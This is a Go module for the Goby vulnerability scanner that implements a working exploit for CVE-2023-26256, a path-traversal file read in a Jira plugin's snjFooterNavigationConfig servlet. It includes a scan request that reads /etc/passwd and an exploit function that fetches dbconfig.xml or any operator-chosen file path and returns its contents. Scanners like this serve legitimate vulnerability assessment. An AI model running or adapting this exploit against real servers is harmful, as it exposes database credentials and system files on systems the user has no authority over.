package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Atlassian Jira snjFooterNavigationConfig fileName Arbitrary File Read Vulnerability (CVE-2023-26256)",
    "Description": "<p>Atlassian Jira is a set of defect tracking management system of Atlassian company in Australia. The system is mainly used to track and manage various problems and defects in the work.</p><p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure state of the website.</p>",
    "Product": "ATLASSIAN-JIRA",
    "Homepage": "https://www.atlassian.com/",
    "DisclosureDate": "2023-02-21",
    "Author": "h1ei1",
    "FofaQuery": "body=\"jira.webresources\" || header=\"atlassian.xsrf.token\" || body=\"ams-build-number\" || title=\"System Dashboard - \" || (body=\"content=\\\"JIRA\" && header!=\"boa\" && body!=\"Server: Boa\") || banner=\"atlassian.xsrf.token\"",
    "GobyQuery": "body=\"jira.webresources\" || header=\"atlassian.xsrf.token\" || body=\"ams-build-number\" || title=\"System Dashboard - \" || (body=\"content=\\\"JIRA\" && header!=\"boa\" && body!=\"Server: Boa\") || banner=\"atlassian.xsrf.token\"",
    "Level": "2",
    "Impact": "<p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure state of the website.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"https://www.atlassian.com/\">https://www.atlassian.com/</a></p>",
    "References": [
        "https://github.com/1nters3ct/CVEs/blob/main/CVE-2023-26256.md"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "filePath",
            "type": "input",
            "value": "../dbconfig.xml",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/plugins/servlet/snjFooterNavigationConfig?fileName=../../../../etc/passwd&fileMime=$textMime",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "regex",
                        "value": "root:.*:0:0:",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/plugins/servlet/snjFooterNavigationConfig?fileName={{{filePath}}}&fileMime=$textMime",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody||"
            ]
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        "CVE-2023-26256"
    ],
    "CNNVD": [
        "CNNVD-202302-2295"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "Atlassian Jira 缺陷跟踪管理系统 snjFooterNavigationConfig 文件 fileName 参数文件读取漏洞（CVE-2023-26256）",
            "Product": "ATLASSIAN-JIRA",
            "Description": "<p>Atlassian Jira是澳大利亚Atlassian公司的一套缺陷跟踪管理系统。该系统主要用于对工作中各类问题、缺陷进行跟踪管理。<br></p><p>攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。<br></p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://www.atlassian.com/\" target=\"_blank\">https://www.atlassian.com/</a></p>",
            "Impact": "<p>攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Atlassian Jira snjFooterNavigationConfig fileName Arbitrary File Read Vulnerability (CVE-2023-26256)",
            "Product": "ATLASSIAN-JIRA",
            "Description": "<p>Atlassian Jira is a set of defect tracking management system of Atlassian company in Australia. The system is mainly used to track and manage various problems and defects in the work.<br></p><p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure state of the website.<br></p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"https://www.atlassian.com/\" target=\"_blank\">https://www.atlassian.com/</a></p>",
            "Impact": "<p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure state of the website.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2023-08-23",
    "PocId": "10715"
}`
	readFile23764zaIAos := func(hostInfo *httpclient.FixUrl, filePath string) (*httpclient.HttpResponse, error) {
		var getRequestConfig *httpclient.RequestConfig
		if filePath == "" {
			getRequestConfig = httpclient.NewGetRequestConfig("/plugins/servlet/snjFooterNavigationConfig?fileName=../dbconfig.xml&fileMime=$textMime")
		} else {
			getRequestConfig = httpclient.NewGetRequestConfig("/plugins/servlet/snjFooterNavigationConfig?fileName=" + filePath + "&fileMime=$textMime")
		}
		getRequestConfig.FollowRedirect = false
		getRequestConfig.VerifyTls = false
		return httpclient.DoHttpRequest(hostInfo, getRequestConfig)
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			response, err := readFile23764zaIAos(hostInfo, "")
			if err != nil {
				return false
			}
			return response.StatusCode == 200 && strings.Contains(response.Utf8Html, "jdbc:")
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			filePath := goutils.B2S(ss.Params["filePath"])
			response, err := readFile23764zaIAos(expResult.HostInfo, filePath)
			if err != nil {
				expResult.Success = false
				expResult.Output = err.Error()
				return expResult
			}
			if response.StatusCode == 200 {
				expResult.Success = true
				expResult.Output = response.Utf8Html
			}
			return expResult
		},
	))
}